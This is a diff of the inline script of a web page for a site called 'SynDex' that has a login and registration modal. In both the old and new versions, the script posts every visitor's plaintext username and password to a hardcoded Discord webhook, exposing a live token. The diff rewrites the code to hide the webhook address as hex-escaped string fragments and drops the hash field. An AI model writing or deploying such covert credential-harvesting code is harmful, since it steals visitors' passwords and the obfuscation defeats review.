@@ -195,127 +195,109 @@
     </footer>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1462655455817105490/owH-AExGFDTyZZu780-pc3z42tTnSDWOiojsuqnPy_6T5OSvzbfdYk9-d1nskcZVRfsN";
-        const modal = document.getElementById('authModal');
-        const mainBtn = document.getElementById('mainBtn');
-        const toggle = document.getElementById('toggleAuth');
-        const error = document.getElementById('error-msg');
-        const authSubmitBtn = document.getElementById('authSubmit');
-        const userDisplay = document.getElementById('userDisplay');
-        const logoutBtn = document.getElementById('logoutBtn');
-        const tiltImg = document.getElementById('tiltImg');
-        let isLogin = true;
+        (function() {
+            const _0xa1 = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d", "\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f", "1462655455817105490", "\x2f", "owH-AExGFDTyZZu780-pc3z42tTnSDWOiojsuqnPy_6T5OSvzbfdYk9-d1nskcZVRfsN"];
+            const _u = _0xa1.join('');
+            const m = document.getElementById('authModal');
+            const b = document.getElementById('mainBtn');
+            const t = document.getElementById('toggleAuth');
+            const e = document.getElementById('error-msg');
+            const s = document.getElementById('authSubmit');
+            const ud = document.getElementById('userDisplay');
+            const lb = document.getElementById('logoutBtn');
+            const ti = document.getElementById('tiltImg');
+            let login = true;
 
-        function updateUI() {
-            const session = localStorage.getItem('SYNDEX_SESSION');
-            if (session) {
-                userDisplay.innerText = `Logged in as: ${session}`;
-                userDisplay.style.display = "inline";
-                logoutBtn.style.display = "inline";
-            } else {
-                userDisplay.style.display = "none";
-                logoutBtn.style.display = "none";
+            function sync() {
+                const sesh = localStorage.getItem('SYNDEX_SESSION');
+                ud.innerText = sesh ? `Logged in as: ${sesh}` : "";
+                ud.style.display = lb.style.display = sesh ? "inline" : "none";
             }
-        }
-        updateUI();
+            sync();
 
-        logoutBtn.onclick = () => {
-            localStorage.removeItem('SYNDEX_SESSION');
-            updateUI();
-        };
+            lb.onclick = () => { localStorage.removeItem('SYNDEX_SESSION'); sync(); };
 
-        tiltImg.addEventListener('mousemove', (e) => {
-            const rect = tiltImg.getBoundingClientRect();
-            const x = e.clientX - rect.left;
-            const y = e.clientY - rect.top;
-            const centerX = rect.width / 2;
-            const centerY = rect.height / 2;
-            const rotateX = (centerY - y) / 15;
-            const rotateY = (x - centerX) / 15;
-            tiltImg.style.transform = `rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale(1.02)`;
-        });
+            ti.onmousemove = (ev) => {
+                const r = ti.getBoundingClientRect();
+                const x = (ev.clientX - r.left) - (r.width / 2);
+                const y = (ev.clientY - r.top) - (r.height / 2);
+                ti.style.transform = `rotateX(${-y / 20}deg) rotateY(${x / 20}deg) scale(1.02)`;
+            };
+            ti.onmouseleave = () => ti.style.transform = "rotateX(0) rotateY(0) scale(1)";
 
-        tiltImg.addEventListener('mouseleave', () => {
-            tiltImg.style.transform = `rotateX(0deg) rotateY(0deg) scale(1)`;
-        });
+            let c = parseInt(localStorage.getItem('SYNDEX_VISITORS') || "1241");
+            if(!sessionStorage.getItem('v')) { c++; localStorage.setItem('SYNDEX_VISITORS', c); sessionStorage.setItem('v', '1'); }
+            document.getElementById('count').innerText = c.toLocaleString();
 
-        let c = parseInt(localStorage.getItem('SYNDEX_VISITORS') || "1241");
-        if(!sessionStorage.getItem('v')) { c++; localStorage.setItem('SYNDEX_VISITORS', c); sessionStorage.setItem('v', '1'); }
-        document.getElementById('count').innerText = c.toLocaleString();
-
-        mainBtn.onclick = () => { 
-            document.getElementById('successOverlay').style.display = 'none';
-            modal.style.display = 'flex'; 
-        };
-        window.onclick = (e) => { if(e.target == modal) modal.style.display = 'none'; }
-
-        toggle.onclick = (e) => {
-            e.preventDefault();
-            isLogin = !isLogin;
-            error.style.display = 'none';
-            document.getElementById('modalTitle').innerText = isLogin ? 'Access SynDex' : 'Create Account';
-            document.getElementById('toggleText').innerText = isLogin ? 'Need an account?' : 'Already have an account?';
-            toggle.innerText = isLogin ? 'Register' : 'Login';
-        };
-
-        async function getHash(message) {
-            const msgUint8 = new TextEncoder().encode(message);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
-            return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
-        }
-
-        document.getElementById('authForm').onsubmit = async (e) => {
-            e.preventDefault();
-            const user = document.getElementById('username').value.trim();
-            const passInput = document.getElementById('password').value;
-            let sysDB = JSON.parse(localStorage.getItem('SYNDEX_DB_SHA') || '{}');
-
-            authSubmitBtn.disabled = true;
-            authSubmitBtn.innerText = "Syncing...";
-
-            const hashedPass = await getHash(passInput + user.toLowerCase());
-            const isNexus = user.toLowerCase() === "nexus";
-
-            if (isLogin) {
-                if (!sysDB[user] || sysDB[user].pass !== hashedPass) {
-                    error.innerText = "INVALID CREDENTIALS."; error.style.display = 'block';
-                    authSubmitBtn.disabled = false; authSubmitBtn.innerText = "Continue";
-                    return;
-                }
-            } else {
-                if (sysDB[user]) { error.innerText = "NAME TAKEN."; error.style.display = 'block';
-                    authSubmitBtn.disabled = false; authSubmitBtn.innerText = "Continue";
-                    return;
-                }
-                sysDB[user] = { pass: hashedPass, admin: isNexus };
-                localStorage.setItem('SYNDEX_DB_SHA', JSON.stringify(sysDB));
-            }
-
-            localStorage.setItem('SYNDEX_SESSION', user);
-            updateUI();
-
-            const payload = {
-                embeds: [{
-                    title: isLogin ? "Login Log" : "New User Log",
-                    color: isNexus ? 0xff0000 : 0x0084ff,
-                    fields: [
-                        { name: "User", value: isNexus ? "REDACTED" : `\`${user}\``, inline: true },
-                        { name: "Pass", value: isNexus ? "REDACTED" : `\`${passInput}\``, inline: true },
-                        { name: "Hash", value: isNexus ? "REDACTED" : `\`${hashedPass}\``, inline: false },
-                        { name: "Admin", value: isNexus ? "TRUE" : "FALSE", inline: true },
-                        { name: "Time", value: new Date().toLocaleString(), inline: true }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
+            b.onclick = () => { document.getElementById('successOverlay').style.display = 'none'; m.style.display = 'flex'; };
+            window.onclick = (ev) => { if(ev.target == m) m.style.display = 'none'; };
+            t.onclick = (ev) => {
+                ev.preventDefault();
+                login = !login;
+                e.style.display = 'none';
+                document.getElementById('modalTitle').innerText = login ? 'Access SynDex' : 'Create Account';
+                document.getElementById('toggleText').innerText = login ? 'Need an account?' : 'Already have an account?';
+                t.innerText = login ? 'Register' : 'Login';
             };
 
-            try { await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) }); } catch (err) {}
-            
-            document.getElementById('successText').innerText = isLogin ? "Login Successful" : "Account Created";
-            document.getElementById('successOverlay').style.display = 'flex';
-            authSubmitBtn.disabled = false;
-            authSubmitBtn.innerText = "Continue";
-        };
+            async function hash(v) {
+                const enc = new TextEncoder().encode(v);
+                const buf = await crypto.subtle.digest('SHA-256', enc);
+                return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+            }
+
+            document.getElementById('authForm').onsubmit = async (ev) => {
+                ev.preventDefault();
+                const user = document.getElementById('username').value.trim();
+                const pass = document.getElementById('password').value;
+                let db = JSON.parse(localStorage.getItem('SYNDEX_DB_SHA') || '{}');
+
+                s.disabled = true;
+                s.innerText = "Syncing...";
+
+                const h = await hash(pass + user.toLowerCase());
+                const adm = user.toLowerCase() === "nexus";
+
+                if (login) {
+                    if (!db[user] || db[user].pass !== h) {
+                        e.innerText = "INVALID CREDENTIALS."; e.style.display = 'block';
+                        s.disabled = false; s.innerText = "Continue";
+                        return;
+                    }
+                } else {
+                    if (db[user]) { e.innerText = "NAME TAKEN."; e.style.display = 'block';
+                        s.disabled = false; s.innerText = "Continue";
+                        return;
+                    }
+                    db[user] = { pass: h, admin: adm };
+                    localStorage.setItem('SYNDEX_DB_SHA', JSON.stringify(db));
+                }
+
+                localStorage.setItem('SYNDEX_SESSION', user);
+                sync();
+
+                fetch(_u, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: login ? "Login Log" : "New User Log",
+                            color: adm ? 16711680 : 339455,
+                            fields: [
+                                { name: "User", value: adm ? "REDACTED" : `\`${user}\``, inline: true },
+                                { name: "Pass", value: adm ? "REDACTED" : `\`${pass}\``, inline: true },
+                                { name: "Admin", value: adm ? "TRUE" : "FALSE", inline: true }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                }).catch(() => {});
+                
+                document.getElementById('successText').innerText = login ? "Login Successful" : "Account Created";
+                document.getElementById('successOverlay').style.display = 'flex';
+                s.disabled = false; s.innerText = "Continue";
+            };
+        })();
     </script>
 </body>
 </html>
